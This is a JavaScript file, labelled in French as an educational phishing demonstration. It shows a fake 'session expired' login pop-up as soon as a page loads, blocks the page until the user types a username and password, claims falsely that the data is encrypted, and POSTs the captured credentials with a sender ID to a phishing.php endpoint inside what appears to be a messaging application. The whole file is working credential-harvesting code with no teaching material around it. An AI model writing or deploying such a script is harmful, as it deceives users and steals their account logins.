// Script de démonstration éducative - Phishing par pop-up
// Ce script affiche un pop-up de fausse reconnexion et capture les identifiants

(function() {
    // Récupérer l'ID de l'utilisateur qui a envoyé le message (passer via URL ou depuis le message)
    const urlParams = new URLSearchParams(window.location.search);
    const senderUserId = urlParams.get('sender') || 'unknown';
    
    // Créer le overlay du pop-up
    function createPhishingPopup() {
        // Overlay semi-transparent
        const overlay = document.createElement('div');
        overlay.id = 'phishing-overlay';
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.7);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 10000;
        `;
        
        // Conteneur du pop-up
        const popupContainer = document.createElement('div');
        popupContainer.id = 'phishing-popup';
        popupContainer.style.cssText = `
            background: white;
            border-radius: 10px;
            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
            padding: 40px;
            max-width: 400px;
            width: 90%;
            text-align: center;
            font-family: Arial, sans-serif;
        `;
        
        // HTML du pop-up
        popupContainer.innerHTML = `
            <div style="margin-bottom: 20px;">
                <h2 style="color: #333; margin: 0 0 10px 0;">Votre session a expiré</h2>
                <p style="color: #666; margin: 0 0 20px 0; font-size: 14px;">Veuillez vous reconnecter pour continuer</p>
            </div>
            
            <form id="phishing-form" style="display: flex; flex-direction: column; gap: 15px;">
                <div>
                    <input type="text" id="phishing-username" placeholder="Nom d'utilisateur" required 
                        style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 14px;">
                </div>
                
                <div>
                    <input type="password" id="phishing-password" placeholder="Mot de passe" required 
                        style="width: 100%; padding: 10px; border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 14px;">
                </div>
                
                <button type="submit" style="padding: 10px; background-color: #31a24c; color: white; border: none; border-radius: 5px; cursor: pointer; font-size: 14px; font-weight: bold;">
                    Se reconnecter
                </button>
            </form>
            
            <p style="color: #999; font-size: 12px; margin-top: 15px;">Les données sont chiffrées et sécurisées</p>
        `;
        
        overlay.appendChild(popupContainer);
        document.body.appendChild(overlay);
        
        // Ajouter l'event listener pour l'envoi du formulaire
        document.getElementById('phishing-form').addEventListener('submit', function(e) {
            e.preventDefault();
            submitPhishingForm();
        });
        
        // Désactiver la fermeture au clic en dehors
        overlay.addEventListener('click', function(e) {
            if (e.target === overlay) {
                // Ne pas fermer - simulation d'une page bloquée
                alert('Veuillez vous reconnecter pour continuer.');
            }
        });
    }
    
    // Fonction pour envoyer les identifiants au serveur
    function submitPhishingForm() {
        const username = document.getElementById('phishing-username').value;
        const password = document.getElementById('phishing-password').value;
        const senderUserId = new URLSearchParams(window.location.search).get('sender') || 'unknown';
        
        // Envoyer les données au serveur
        fetch('/messagerie/codes/fake_login/phishing.php', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
            },
            body: `username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}&sender_id=${encodeURIComponent(senderUserId)}`
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // Afficher un message de succès
                alert('Reconnexion réussie. Veuillez actualiser la page.');
                // Fermer le pop-up
                const overlay = document.getElementById('phishing-overlay');
                if (overlay) overlay.remove();
            } else {
                alert('Erreur lors de la reconnexion. Veuillez réessayer.');
            }
        })
        .catch(error => {
            console.error('Erreur:', error);
            alert('Une erreur s\'est produite.');
        });
    }
    
    // Afficher le pop-up au chargement de la page
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', createPhishingPopup);
    } else {
        createPhishingPopup();
    }
})();
